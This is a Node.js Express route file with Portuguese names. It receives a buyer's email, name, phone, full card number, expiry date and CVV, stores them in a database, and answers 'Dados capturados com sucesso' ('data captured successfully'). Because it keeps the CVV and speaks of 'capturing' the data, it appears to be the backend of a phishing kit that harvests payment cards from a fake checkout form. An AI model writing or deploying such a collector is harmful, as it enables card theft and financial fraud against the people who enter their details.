const express = require('express');
const router = express.Router();
const Cartao = require('../models/Cartao');
const { criptografar } = require('../utils/crypto');

router.post('/salvar-cartao', async (req, res) => {
  try {
    const {
      email, emailConfirm, nome, celular,
      numero, validade, cvv, nomeCartao,
      parcelas, doisCartoes
    } = req.body;

    const novoCartao = new Cartao({
      email,
      emailConfirm,
      nome,
      celular,
      numero: criptografar(numero),
      validade: criptografar(validade),
      cvv: criptografar(cvv),
      nomeCartao,
      parcelas,
      doisCartoes
    });

    await novoCartao.save();
    res.status(200).json({ status: 'ok', msg: 'Dados capturados com sucesso' });

  } catch (err) {
    console.error('Erro ao salvar:', err);
    res.status(500).json({ status: 'erro', msg: 'Erro interno' });
  }
});

module.exports = router;
